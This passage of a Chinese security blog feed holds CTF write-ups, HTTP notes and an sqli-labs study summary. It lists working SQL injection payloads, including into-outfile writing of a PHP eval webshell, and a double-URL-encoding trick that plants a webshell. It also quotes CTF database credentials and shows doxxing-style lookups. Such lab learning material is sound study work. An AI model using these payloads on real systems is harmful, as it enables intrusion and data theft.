<h3 id="丘比龙De女神"><a href="#丘比龙De女神" class="headerlink" title="丘比龙De女神"></a>丘比龙De女神</h3><p>放到binwalk里面可知有一个zip的尾，那么对比一下其他的gif图片，找到图片结尾，然后添加上zip文件头，密码为zip头后面的love，解压出来，利用hash查看工具查询到md5值改为小写提交即可</p>
<h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy!"></a>easy!</h3><p>base64解码</p>
<h3 id="KeyBoard"><a href="#KeyBoard" class="headerlink" title="KeyBoard"></a>KeyBoard</h3><p>根据字母与键盘上的位置连线得到flag</p>
<h3 id="base64全家桶"><a href="#base64全家桶" class="headerlink" title="base64全家桶"></a>base64全家桶</h3><p>一次base64，一次base32，一次base16 <a href="http://pbaseconverter.com/" target="_blank" rel="external">解密网站</a></p>
<h3 id="n次base64"><a href="#n次base64" class="headerlink" title="n次base64"></a>n次base64</h3><p>直接上代码：</p>
<pre><code>import base64
str1=&apos;&apos;&apos;&apos;&apos;&apos;
for i in range(1,16):
    str1=base64.b64decode(str1)
print str1
</code></pre><h3 id="骚年来一发吗"><a href="#骚年来一发吗" class="headerlink" title="骚年来一发吗"></a>骚年来一发吗</h3><p>根据加密代码反处理写出解密代码：</p>
<pre><code>&lt;?php 

function decode($string){
    $string=base64_decode(strrev(str_rot13($string)));
    for($_0=0;$_0&lt;strlen($string);$_0++){
        $_c=substr($string,$_0,1);
        $__=ord($_c)-1;
        $_c=chr($__);
        $_=$_.$_c;
    }
    $string=strrev($_);
    return $string;
}

$string=&apos;iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas&apos;;
echo decode($string);
?&gt;
</code></pre><h3 id="mixed-base64"><a href="#mixed-base64" class="headerlink" title="mixed_base64"></a>mixed_base64</h3><p>多重base64，32,16加密代码如下：</p>
<pre><code>import base64
code1=&apos;&apos;
code1=base64.b32decode(code1)
code1=base64.b16decode(code1)
code1=base64.b16decode(code1)
code1=base64.b64decode(code1)
code1=base64.b16decode(code1)
code1=base64.b64decode(code1)
code1=base64.b32decode(code1)
code1=base64.b16decode(code1)
code1=base64.b32decode(code1)
code1=base64.b32decode(code1)
print code1
</code></pre><h3 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h3><p>简单的异或</p>
<pre><code>file_a=open(&apos;1.txt&apos;,&apos;rb&apos;)  
file_b=open(&apos;2.txt&apos;,&apos;rb&apos;)  

a=file_a.read()  
b=file_b.read()  

s=&apos;&apos;  
for i,j in zip(a,b):  
    s+=chr(ord(i)^ord(j))  
print s
</code></pre><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>MD5恢复</p>
<pre><code>import hashlib     
src1=&quot;TASC&quot;  
src2=&quot;O3RJMV&quot;  
src3=&quot;WDJKX&quot;  
src4=&quot;ZM&quot;  
dic = [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;,&apos;I&apos;,&apos;J&apos;,&apos;K&apos;,&apos;L&apos;,&apos;M&apos;,&apos;N&apos;,&apos;O&apos;,&apos;P&apos;,&apos;Q&apos;,&apos;R&apos;,&apos;S&apos;,&apos;T&apos;,&apos;U&apos;,&apos;V&apos;,&apos;W&apos;,&apos;X&apos;,&apos;Y&apos;,&apos;Z&apos;]  
for i in range(26):  
    for j in range(26):  
        for k in range(26):  
            src=src1+dic[i]+src2+dic[j]+src3+dic[k]+src4
            m2 = hashlib.md5()  
            m2.update(src)  
            m3=str(m2.hexdigest())
            if (m3[0:5]==&apos;e9032&apos; and m3[8:10]==&apos;da&apos;):
                print src
                print m3
</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="easy-wireshark"><a href="#easy-wireshark" class="headerlink" title="easy wireshark"></a>easy wireshark</h3><p>题目提示为抓住他浏览网页的包，那么就过滤一下http协议，发现有一个</p>
<pre><code>http://115.28.150.176/misc/flag.php 
</code></pre><p>进去得到flag</p>
<h3 id="wireshark-2"><a href="#wireshark-2" class="headerlink" title="wireshark 2"></a>wireshark 2</h3><p>通过追踪TCP流发现有一个压缩包里面有flag.txt文件那么放在kali里面用foremost命令提取一下得到一个压缩包，但是有密码打不开，那么用记事本打开流量包搜索一下pass看是否有密码，然后得到了压缩包的密码，打开得到flag</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Write-up </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[http协议]]></title>
      <url>http://isron.cn/2016/11/08/http/</url>
      <content type="html"><![CDATA[<p>在读《Web安全深度剖析》时看到一些关于HTTP协议的东西，记录下来，供以后查看，学习。<br><a id="more"></a></p>
<h2 id="HTTP协议概述"><a href="#HTTP协议概述" class="headerlink" title="HTTP协议概述"></a>HTTP协议概述</h2><p>　　HTTP是一种无状态的协议。无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，也就是说当一个客户端向服务器发出请求，然后web服务器返回响应，连接就被关闭了，在服务器端不保留连接的有关信息。<br>　　HTTP请求只能由客户端发起，而服务器不能主动向客户发送数据。</p>
<h2 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>　　GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本，那么返回文本是Web容器解析后的HTML源代码，而不是源文件。</p>
<h3 id="HEAD"><a href="#HEAD" class="headerlink" title="HEAD"></a>HEAD</h3><p>　　HEAD方法除了服务器不能在响应里面返回消息主体外，其他都与GET方法相同。此方法经常被用来测试超文本链接的有效性，可访问性和最近的改变。攻击者编写扫描工具时，就常用此方法，因为只测试资源是否存在，而不用返回消息主题，速度是最快的。</p>
<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>　　POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。POST    请求最多用于向服务器发送大量的数据。GET虽然也能发送数据，但是有长度的限制，并且GET请求会将发送的数据显示在浏览器端，二POST则不会。所以安全性相对来说高一点。<br>　　例如，上传文件，提交留言等，只要是想服务器传输大量的数据，通常都会使用POST请求。</p>
<h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>　　PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据，作为指定资源的最新修改版。如果请求指定的资源不存在，将会创建这个资源，且数据位于请求正文。<br>　　通常情况下，服务器都会关闭PUT方法，因为它会为服务器创建文件，属于危险操作。</p>
<h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>　　DELETE方法用于请求源服务器删除请求的指定资源。服务器一般会关闭此方法，因为客户端可以进行删除文件操作，同样属于危险操作。</p>
<h3 id="TRACE"><a href="#TRACE" class="headerlink" title="TRACE"></a>TRACE</h3><p>　　TRACE方法用于激发一个远程的应用层的请求信息回路，也就是说，回显服务器收到的请求。TRACE方法允许客户端去了解数据被请求链的另一端接收的情况，并且利用那些数据信息去测试或诊断。不过较为少见。</p>
<h3 id="CONNECT"><a href="#CONNECT" class="headerlink" title="CONNECT"></a>CONNECT</h3><p>　　CONNECT方法是为了用于能动态切换到隧道的代理。</p>
<h3 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h3><p>　　OPTIONS方法是用于请求获得由URI标识的资源在请求/响应的通信过程中可以使用的功能选项。通过这个方法，客户端可以在采取具体资源请求之前，决定对该资源采取何种必要措施，或者了解服务器的性能。</p>
<h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><p>　　当客户端发出HTTP请求，服务器端接收后，会向客户发送响应信息，其中，HTTP响应中的第一行中，最重要的一点就是HTTP的状态码。HTTP协议中的状态码由三位数字组成。第一位数字定义了响应的类别，且只有以下5种。</p>
<h3 id="1xx"><a href="#1xx" class="headerlink" title="1xx"></a>1xx</h3><p>　　信息提示，表示请求已被成功接收，继续处理。范围为100～101。</p>
<h3 id="2xx"><a href="#2xx" class="headerlink" title="2xx"></a>2xx</h3><p>　　成功，服务器成功的处理了请求。范围为200～206。</p>
<h3 id="3xx"><a href="#3xx" class="headerlink" title="3xx"></a>3xx</h3><p>　　重定向，重定向状态码用于告诉浏览器客户端，他们访问的资源已被移动，并告诉客户端新的资源地址位置。这时，浏览器将重新对新资源发起请求。范围为300～305。</p>
<h3 id="4xx"><a href="#4xx" class="headerlink" title="4xx"></a>4xx</h3><p>　　客户端错误状态码，有时客户端会发送一些服务器无法处理的东西，比如格式错误的请求，或者最常见的请求一个不存在的URL。其范围为400～415。</p>
<h3 id="5xx"><a href="#5xx" class="headerlink" title="5xx"></a>5xx</h3><p>　　有时候客户端发送了一条有效请求，但Web服务器自身却出错了，可能是Web服务器运行出错了，或者网站都挂了，5xx就是用来描述服务器内部错误的。范围为500～505。</p>
<h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><pre><code>200: 客户端请求成功
302: 重定向
404: 请求资源不存在
400: 客户端请求有语法错误，不能被服务器所理解
401: 请求未经授权
403: 服务器收到请求，但是拒绝提供服务
500: 服务器内部错误
503: 服务器当前不能处理客户端的请求，一段时间后可能恢复
</code></pre><h2 id="HTTP消息"><a href="#HTTP消息" class="headerlink" title="HTTP消息"></a>HTTP消息</h2><p>　　HTTP消息又称为HTTP头（HTTP header），由四部分组成，分别是请求头，响应头，普通头和实体头。</p>
<h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><p>　　请求头只出现在HTTP请求中，请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。常见的HTTP请求头如下：</p>
<pre><code>Host ：指定被请求资源的Internet主机和端口号
User-Agent：操作系统，浏览器版本及其他属性
Referer：代表当前访问URL的上一个URL
Cookie：一段文本，常用来表示请求者的身份
</code></pre>]]></content>
      
        <categories>
            
            <category> 读书笔记 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqli-labs学习笔记总结]]></title>
      <url>http://isron.cn/2016/10/25/sqli-labs/</url>
      <content type="html"><![CDATA[<p>本来是不打算写这个总结了，发现做题的时候好多知识都忘记了，还是写一下吧<br><a id="more"></a></p>
<h2 id="Sqli-less-1-2-3-4"><a href="#Sqli-less-1-2-3-4" class="headerlink" title="Sqli-less-1,2,3,4"></a>Sqli-less-1,2,3,4</h2><p>因为1，2,3,4都差不多就放一起说了<br>Mysql 常用指令:</p>
<pre><code>Show databases; 显示数据库名
Show tables; 显示表名    
Desc table； 查看表的信息
select * from table_name：查看该表里的所有内容
</code></pre><p>一些sql命令:</p>
<pre><code>order by :用于对结果集进行排序 在sql注入里通常查看有多少字段
select ：语句用于从表中选取数据 
union select ：用于合并两个或多个select 语句的结果集 在sql注入里表示联合查询
concat ：返回字符串连接的结果
通过information_schema查看security的内容： select table_name from information_schema.tables where table_schema=&apos;security&apos;; Where 是查询条件
</code></pre><p>主要payload：<br>爆表名：</p>
<pre><code>http://127.0.0.1/Less-4/?id=1&quot;) union select 1,table_name,3 from information_schema.tables where table_schema=&apos;security&apos;limit 1,1--+
</code></pre><p>爆出全部表名：</p>
<pre><code>http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+ //利用group_concat函数直接输出全部表名
</code></pre><p>爆列名：</p>
<pre><code>http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+
</code></pre><p>爆内容：</p>
<pre><code>http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,group_concat(username,password),3 from users--+ 
</code></pre><h2 id="Sqli-less-5-6"><a href="#Sqli-less-5-6" class="headerlink" title="Sqli-less-5,6"></a>Sqli-less-5,6</h2><p>基于错误的注入：</p>
<pre><code>rand()获得一个0-1的随机数
floor 向下取整
group by 排序
count() 统计
</code></pre><p>主要payload：</p>
<pre><code>http://127.0.0.1/Less-5/?id=-1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
</code></pre><p>利用Extractvalue函数报错：</p>
<pre><code>http://127.0.0.1/Less-5/?id=1&apos; and extractvalue(1, concat(0x7e, (select database()),0x7e)) --+
</code></pre><p>利用Updatexm函数报错：</p>
<pre><code>http://127.0.0.1/Less-5/?id=1&apos;  and (updatexml(1,concat(0x3a,(select database())),1))--+
</code></pre><h2 id="sqli-less-7"><a href="#sqli-less-7" class="headerlink" title="sqli-less-7"></a>sqli-less-7</h2><p>利用注入去写入文件，在知道绝对路径的情况下可以写入一句话木马<br>outfile函数：</p>
<pre><code>select into outfile //将表的内容导出为一个文本文件 
select [列名] from table [where 语句]
into outfile ‘目标文件’ [option];
</code></pre><p>dumpfile函数 将表的内容导出一行</p>
<pre><code>select * from users limit 0,1 into dumpfile &apos;c:/2.txt&apos;;
</code></pre><p>load_file函数 将数据导入mysql</p>
<pre><code>select load_file (&apos;c:/1.txt&apos;)
</code></pre><p>读写权限测试：</p>
<pre><code>and (select count(*)from mysql.user)&gt;0 --+ //如果返回正常则有读写权限
</code></pre><p>主要payload：</p>
<pre><code>http://127.0.0.1/Less-7/?id=1&apos;))union select 1,2,3 into outfile &apos;D:/wamp/www/Less-7/1.txt&apos; --+  //在绝对路径生成一个1.txt文件
http://127.0.0.1/Less-7/?id=1&apos;))  union select 1,load_file(&apos;D:/wamp/www/Less-7/1.jpg&apos;),3 into outfile &apos;D:/wamp/www/Less-7/1.php&apos; --+  //将一句话木马上传到网站目录上
</code></pre><h2 id="sqli-less-8-9-10-15-16"><a href="#sqli-less-8-9-10-15-16" class="headerlink" title="sqli-less-8,9,10,15,16"></a>sqli-less-8,9,10,15,16</h2><p>盲注<a href="http://isron.cn/2016/09/22/sql_mz/">之前的盲注笔记</a></p>
<h2 id="sqli-less-11-12"><a href="#sqli-less-11-12" class="headerlink" title="sqli-less-11,12"></a>sqli-less-11,12</h2><p>post传参注入<br>常见的万能密码：<br>    or 1=1 #<br>    ‘or’=’or’<br>主要payload：</p>
<pre><code>uname=111&apos; or 1=1 #&amp;passwd=111&amp;submit=Submit  //成功登陆 可以添加一个limit函数 获取其他的name password 然后可以在111’后构建攻击代码
</code></pre><h2 id="sqli-less-13-14"><a href="#sqli-less-13-14" class="headerlink" title="sqli-less-13,14"></a>sqli-less-13,14</h2><p>基于错误的post型注入</p>
<h2 id="sqli-less-17"><a href="#sqli-less-17" class="headerlink" title="sqli-less-17"></a>sqli-less-17</h2><p>密码重置注入<br>update语句：</p>
<pre><code>作用：用于修改表中的数据
语法： update 表名称 set 列名称 = 新值 where 列名称 = 某值
例句： update users set password= &apos;Dumb&apos; where username = &apos;Dumb&apos;; 修改users表中Dumb的密码。
其中“set 列名称 = 新值” 新值可以为逻辑运算的结果（True or False）
</code></pre><p>password型的基于错误的注入<br>主要payload：<br>rand随机数型：</p>
<pre><code>uname=admin&amp;passwd=&apos; or (select * from (select count(*),concat(0x3a,database(),0x3a,floor(rand()*2))a from information_schema.tables group by a)b)# &amp;submit=Submit
</code></pre><p>extractvalue型：</p>
<pre><code>uname=admin&amp;passwd=&apos; or (updatexml(1,concat(0x3a,(select database()),0x3a),1)) #&amp;submit=Submit
</code></pre><p>updatexml型：</p>
<pre><code>uname=admin&amp;passwd=&apos; or (updatexml(1,concat(0x3a,(select database()),0x3a),1)) #&amp;submit=Submit
</code></pre><h2 id="sqli-less-18"><a href="#sqli-less-18" class="headerlink" title="sqli-less-18"></a>sqli-less-18</h2><p>insert 语句：</p>
<pre><code>作用：insert into 用于向表格中插入新的行
语法：insert into 表名称 values（值1，值2，......）
例句：insert into users values(15,&apos;aaaa&apos;,&apos;aaaa&apos;); 向users表中插入新的数据
注： insert与update一样  values可以插入逻辑运算结果
</code></pre><p>利用user-agent进行基于错误的注入：<br>主要payload：</p>
<pre><code>User-Agent:&apos;,extractvalue (1,concat(0x3a,(select database()),0x3a)))#
</code></pre><h2 id="sqli-less-19"><a href="#sqli-less-19" class="headerlink" title="sqli-less-19"></a>sqli-less-19</h2><p>利用referer进行基于错误的注入<br>主要payload：</p>
<pre><code>Referer: 1&apos;,extractvalue(1, concat(0x7e, (select database()),0x7e))) #
</code></pre><h2 id="sqli-less-20-21-22"><a href="#sqli-less-20-21-22" class="headerlink" title="sqli-less-20,21,22"></a>sqli-less-20,21,22</h2><p>利用cookie进行注入<br>主要payload：</p>
<pre><code>Cookie: uname=1&apos; union select 1,database(),@@version #   //less20
Cookie:uname=MScpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksQEB2ZXJzaW9uICM=   //less21 进行编码绕过
Cookie: uname=MSIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSxAQHZlcnNpb24gIw==
</code></pre><h2 id="sqli-less-23-37"><a href="#sqli-less-23-37" class="headerlink" title="sqli-less-23-37"></a>sqli-less-23-37</h2><p>基于waf的Get型注入 <a href="http://isron.cn/2016/10/15/sql_bypass/">sql绕过技巧</a></p>
<h2 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h2><pre><code>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。
如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。
</code></pre>]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第七季极客大挑战]]></title>
      <url>http://isron.cn/2016/10/21/geek/</url>
      <content type="html"><![CDATA[<p>第一次参加这样的比赛，写个write up平复一下心情<br><a id="more"></a></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h3><p>第一次用火狐打开发现是一堆乱码，然后换用360变成了一个下载链接，是一个gif图，像素应该是280*280，改下像素，然后分帧，得到单个的图片，一个一个的扫码。</p>
<h3 id="Come-game"><a href="#Come-game" class="headerlink" title="Come_game"></a>Come_game</h3><p>第一次做直接玩通关了，竟然真的有flag，但是我死了400多次= =，仔细去审下题，有一个save存档，把000132直接改为000135即可通关。</p>
<h3 id="snow"><a href="#snow" class="headerlink" title="snow"></a>snow</h3><p>提示为html隐写，好吧百度一下，有个链接<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="external">snow html隐写</a><br>进去把网页跟key输进去即可得到flag</p>
<h3 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h3><p>提示有key，然后是音频文件，想到用MP3Stego<br><img src="http://i1.piimg.com/567571/b53c0ebf5552a22a.png" alt=""><br>解密可得到一个txt文件里面就是flag</p>
<h3 id="凯撒部长的奖励"><a href="#凯撒部长的奖励" class="headerlink" title="凯撒部长的奖励"></a>凯撒部长的奖励</h3><p>一长串凯撒密码，分享一个链接<a href="http://planetcalc.com/1434/" target="_blank" rel="external">凯撒密码解密</a>可以把26种情况全部列出来</p>
<h3 id="MD5cracker"><a href="#MD5cracker" class="headerlink" title="MD5cracker"></a>MD5cracker</h3><p>放到MD5解密里面说不说正常的MD5，然后看了下确实是32位，发现有一个字符是|将其改为1，得出flag</p>
<h3 id="PEN-AND-APPLE"><a href="#PEN-AND-APPLE" class="headerlink" title="PEN_AND_APPLE"></a>PEN_AND_APPLE</h3><p>提示与type有关，并没有想到其他的东西，然后RcoIl同学提示说是NTFS流文件，百度一下，原来type命令可以隐藏信息</p>
<pre><code>type 2.txt&gt;1.txt: shujuliu.txt,回车.即可将文件2.txt的内容加入1.txt, 内容以数据流方式保存,该数据流名为shujuliu.txt
</code></pre><p>用alternatestreamview可以提取出里面的东西发现有张flag图片</p>
<h3 id="藏着小秘密的流量包"><a href="#藏着小秘密的流量包" class="headerlink" title="藏着小秘密的流量包"></a>藏着小秘密的流量包</h3><p>下载发现是一个14M的流量包，感觉很奇怪，也太大了吧，放到kali里面用binwalk查一下发现里面藏了好多东西，然后foremost提取一下，得到一个flag的压缩包解压就可得到flag</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web_1"></a>web_1</h3><p>考基础知识，查看响应头发现flag在里面</p>
<h3 id="web-2"><a href="#web-2" class="headerlink" title="web_2"></a>web_2</h3><p>进去发现说我不是admin，然后用burpsuite抓下包，把邮箱改为admin发现还是不行，看到后面有个root应该是权限的意思将0改为1，便得到了flag</p>
<h3 id="Social-Engineeing"><a href="#Social-Engineeing" class="headerlink" title="Social Engineeing"></a>Social Engineeing</h3><p>之前思路一直是在找百度id上面，以为要从百度id里面得到帖子，里面有flag= =，却忘了最重要的社工库，还好RcoIl同学告诉我，从社工库里面找到名字然后，域名，然后进行whois查询，具体流程如下：<br>通过挂VPN访问社工库<a href="http://s.70sec.com/" target="_blank" rel="external">http://s.70sec.com/</a> 得到邮箱名字为肖力，然后去百度贴吧发现有一个肖力吧里面写了一个qq号，刚开始以为加qq就能得到flag，跟他私聊并没有理我= =，然后看到资料里有个域名通过whois反查得到邮箱Google一下邮箱发现有一个奇怪的电话号码，想起题目里也有一个电话号码，提交即是flag</p>
<h3 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h3><p>通过联合查询获取到表名与列名<br>查字段</p>
<pre><code>?sycid=-2 union select 1,2,3
select * from syc where sycid=-2 union select 1,2,3
1-&gt;3-&gt;2 
</code></pre><p>获取数据库名</p>
<pre><code>?sycid=-2 union select 1,2,database()
1-&gt;sycsqli1-&gt;2 
</code></pre><p>获取表名</p>
<pre><code>?sycid=-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;sycsqli1&apos;
1-&gt;#FL4G#,syc-&gt;2  
</code></pre><p>获取列名</p>
<pre><code>?sycid=-2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;%23%46%4C%34%47%23&apos;
1-&gt;id,flag-&gt;2 
</code></pre><p>然后进行flag查询</p>
<pre><code>?sycid=-2 union select 1,2,flag from %23%46%4C%34%47%23
</code></pre><p>并出不来结果#被当做了注释符<br>放到sqlmap里面跑一下</p>
<pre><code>-u http://web.sycsec.com/d03e52c272e42e7c/?sycid=1 --dump -C flag -T #FL4G# -D sycsqli1
</code></pre><p>爆出flag</p>
<h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><p>发现是post型的先试下admin登录提示Login Failed，看下post的数据发现有个debug将0改为1出现了查询语句，然后考虑下构造万能密码</p>
<pre><code>username=admin or 1=1 #
&amp;password=dasd
&amp;debug=1
</code></pre><p>爆出信息为</p>
<pre><code>SQL query: SELECT * FROM users WHERE username=&apos;admin or 1=1 #&apos; AND password=&apos;dasd&apos;
</code></pre><p>注释符应该是被过滤掉了不能正常进行注释，然后考虑进行单引号完美闭合，不用注释符</p>
<pre><code>username=admin&apos; or &apos;1&apos;=&apos;1 
&amp;password=dasd
&amp;debug=1
</code></pre><p>得到flag</p>
<h3 id="127-0-0-x"><a href="#127-0-0-x" class="headerlink" title="127.0.0.x"></a>127.0.0.x</h3><p>后面好多滴滴滴啊，刷新一下发现滴滴滴的数目会变换，然后用Python数下数目滴滴滴的数目在50-55之间随机，滴滴滴的数目应该就是x的值。试下得到flag</p>
<h3 id="php-is-fun"><a href="#php-is-fun" class="headerlink" title="php_is_fun"></a>php_is_fun</h3><pre><code>&lt;?php
if(isset($_GET) &amp;&amp; !empty($_GET)){
    $url = $_GET[&apos;file&apos;];
    $path = &quot;upload/&quot;.$_GET[&apos;path&apos;];
}else{
    show_source(__FILE__);
    exit();
}

if(strpos($path,&apos;..&apos;) &gt; -1){  //path不能存在../防止跨文件上传
    die(&apos;SYCwaf!&apos;);
}

if(strpos($url,&apos;http://127.0.0.1/&apos;) === 0){ //file开头应为http://127.0.0.1/
    file_put_contents($path, file_get_contents($url));
    echo &quot;console.log($path update successed!)&quot;;
}else{
    echo &quot;Hello.Geeker&quot;;
}
</code></pre><p>最开始的想法是直接在file=<a href="http://127.0.0.1" target="_blank" rel="external">http://127.0.0.1</a> 后面加一句话</p>
<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/%3C?php%2520eval($_POST[%27shell%27]);?%3E&amp;path=123.php
</code></pre><p>发现都被过滤掉了，然后看了下RcoIl的payload</p>
<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C?php%2520eval($_POST[%27shell%27]);?%3E&amp;path=shell.php
</code></pre><p>可以先尝试访问下</p>
<pre><code>http://game.sycsec.com:50084/?file=http://127.0.0.1/&amp;path=%3C?php%2520eval($_POST[%27shell%27]);?%3E
</code></pre><p>然后查看源代码发现它把一句话当做上传目录了然后在进行一次file path上传就把这个url作为了file上传，从而将一句话写入到了upload里<br>用木马连下就得到flag<br>借鉴RcoIl的话：<br>由于服务器在接收GET参数的时候本身就会对参数进行一次URL解码 , 因此需要对file参数进行两次URL编码然后再进行传递,其实这里有问题就只是空格,空格URL编码后为%20,但是因为这里进行了两次URL解码因此需要将空格的URL编码再进行编码最后再传递,其实也只需要对%20中的%进行URL编码是%25<br>补充一个get知识</p>
<pre><code>在http协议中GET请求中如果包含多个参数 , 参数之间使用&amp;分隔 , 因此这里要对file参数中的&amp;进行处理 , 或者因为file就是一个完整的参数 , 可以将其整体进行URL编码 , 然后再进行参数的传递
</code></pre><h3 id="撸啊撸"><a href="#撸啊撸" class="headerlink" title="撸啊撸"></a>撸啊撸</h3><p>刚开始做这个题目，提示说任意下载，然后右键保存图片，出来一个png文件，一脸懵逼.PNG，想半天不知道怎么做，然后就去看了下RcoIl哥哥的write up，说发现一个download.php，然而我还是没有发现= =，点了下图片，发现是可以点的，WTF，Isron卒。<br>因为是任意下载啦，就用download.php把源码下载下来。</p>
<pre><code>http://lol.sycsec.com/download.php?display.php
</code></pre><p>源码：</p>
<pre><code>&lt;?php
    error_reporting(0);
    $config = include &quot;config.inc.php&quot;;

    if (isset($_GET[&apos;id&apos;])){
        $id = intval($_GET[&apos;id&apos;]);
        $conn = mysqli_connect($config[&apos;db_host&apos;],$config[&apos;db_user&apos;],$config[&apos;db_pwd&apos;],$config[&apos;database&apos;]);

        if (mysqli_connect_errno($conn)){
            die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
        }

        $sql = &quot;SELECT path FROM images WHERE id={$id}&quot;;
        $result = mysqli_query($conn,$sql);
        $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
        $path = $row[&apos;path&apos;];
    } else{
        die(&apos;Missing parameter id&apos;);
    }
?&gt;
</code></pre><p>发现有一个include函数：</p>
<pre><code>include说明：
在 PHP 中，您能够在服务器执行 PHP 文件之前把该文件插入另一个 PHP 文件中。
</code></pre><p>也就是说还有一个cofig.inc.php文件，接着下载：</p>
<pre><code>&lt;?php
return array(
    &apos;db_host&apos; =&gt; &apos;localhost&apos;,
    &apos;db_user&apos; =&gt; &apos;syclol&apos;,
    &apos;db_pwd&apos; =&gt; &apos;fJBGpEfu3wWLvNHB&apos;,
    &apos;database&apos; =&gt; &apos;syclol&apos;
);
</code></pre><p>发现是一个数据库信息，说明是存在注入的，抓下包发现有一个api.php去获取图片，那就接着下载吧= =</p>
<pre><code>&lt;?php
    error_reporting(0);
    include &quot;json.php&quot;;
    $config = include &quot;config.inc.php&quot;;

    if (isset($_GET[&apos;img_first&apos;]) and isset($_GET[&apos;img_num&apos;])){
        $img_first = $_GET[&apos;img_first&apos;];
        $img_num = $_GET[&apos;img_num&apos;];
        $conn = mysqli_connect($config[&apos;db_host&apos;],$config[&apos;db_user&apos;],$config[&apos;db_pwd&apos;],$config[&apos;database&apos;]);

        if (mysqli_connect_errno($conn)){
            die(&quot;Can not connect mysql!&quot;.mysqli_connect_error());
        }

        $check = is_numeric($img_num) and is_numeric($img_first);

        if (!$check){
            $img_num = intval($img_num);
            $img_first = intval($img_first);
        }

        $sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
        $result = mysqli_query($conn,$sql);

        $i = 0;
        while($row=mysqli_fetch_array($result,MYSQLI_ASSOC)){
            $rows[$i] = $row;
            $i++;
        }
        $json = new Services_JSON();
        echo $json-&gt;encode(array(&apos;result&apos;=&gt;$rows));
        //echo json_encode(array(&apos;result&apos;=&gt;$rows),JSON_UNESCAPED_SLASHES);
    }else {
        die(&quot;Missing parameter img_first or img_num&quot;);
    }
</code></pre><p>发现有sql语句：</p>
<pre><code>$sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;
</code></pre><p>引用下我大哥的话：</p>
<pre><code>既然是程序和用户交互的地方，因为这种地方在参数传递的时候没有对参数的类型和正确性进行判断，那就会留给我们利用的余地。
$check = is_numeric($img_num) and is_numeric($img_first);
if (!$check){
        $img_num = intval($img_num);
        $img_first = intval($img_first);
